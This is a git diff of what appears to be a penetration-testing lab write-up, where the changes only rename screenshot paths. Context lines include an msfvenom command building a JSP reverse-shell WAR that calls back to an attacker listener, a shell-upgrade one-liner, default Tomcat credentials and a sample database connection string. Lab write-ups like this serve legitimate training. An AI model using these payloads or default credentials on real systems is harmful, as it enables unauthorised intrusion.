@@ -245,7 +245,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o r
 
 ![](<../../../.gitbook/assets/image (13).png>)
 
-![](<../../../.gitbook/assets/image (61) (1).png>)
+![](<../../../.gitbook/assets/image (61) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (64) (1) (1) (1).png>)
 
@@ -260,7 +260,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ![](<../../../.gitbook/assets/image (23) (1).png>)
 
-![](<../../../.gitbook/assets/image (39) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1) (1).png>)
 
 ```
 tomcat:tomcat
@@ -286,7 +286,7 @@ role1:tomcat
 
 > The HyperText Transfer Protocol (HTTP) 401 Unauthorized response status code indicates that the client request has not been completed because it lacks valid authentication credentials for the requested resource.
 
-![](<../../../.gitbook/assets/image (57).png>)
+![](<../../../.gitbook/assets/image (57) (1).png>)
 
 ```
 admin:admin
@@ -294,7 +294,7 @@ admin:admin
 
 ![](<../../../.gitbook/assets/image (65) (1).png>)
 
-![](<../../../.gitbook/assets/image (67) (1).png>)
+![](<../../../.gitbook/assets/image (67) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (9).png>)
 
@@ -311,7 +311,7 @@ Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 /var/www/html/project/354253425234234/flag.txt
 ```
 
-![](<../../../.gitbook/assets/image (69) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1) (1).png>)
 
 ## Enumeration - 172.16.64.199
 
